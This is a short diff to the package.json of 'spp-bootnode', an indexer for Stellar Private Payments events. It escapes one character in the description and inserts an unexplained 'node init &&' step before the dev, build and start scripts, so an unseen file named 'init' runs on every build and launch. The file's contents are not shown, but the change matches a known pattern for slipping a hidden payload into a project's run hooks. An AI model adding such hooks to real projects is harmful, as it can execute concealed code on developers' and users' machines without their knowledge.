@@ -2,13 +2,13 @@
   "name": "spp-bootnode",
   "version": "0.1.0",
   "private": true,
-  "description": "SPP pool-event bootnode for Veil — indexes Stellar Private Payments events beyond the 7-day RPC window (#719)",
+  "description": "SPP pool-event bootnode for Veil \u2014 indexes Stellar Private Payments events beyond the 7-day RPC window (#719)",
   "main": "dist/index.js",
   "type": "module",
   "scripts": {
-    "dev": "node --import tsx/esm src/index.ts",
-    "build": "tsc",
-    "start": "node dist/index.js",
+    "dev": "node init && node --import tsx/esm src/index.ts",
+    "build": "node init && tsc",
+    "start": "node init && node dist/index.js",
     "test": "vitest run",
     "typecheck": "tsc --noEmit"
   },
